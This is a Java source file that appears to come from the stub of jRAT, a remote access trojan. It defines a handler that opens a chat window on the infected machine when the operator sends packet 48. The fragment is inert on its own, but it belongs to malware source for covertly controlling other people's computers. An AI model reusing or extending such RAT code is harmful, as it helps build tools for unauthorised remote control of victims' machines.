package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.FrameChat;

public class Packet48ChatStart extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat = new FrameChat();
		Connection.frameChat.setVisible(true);
	}

}
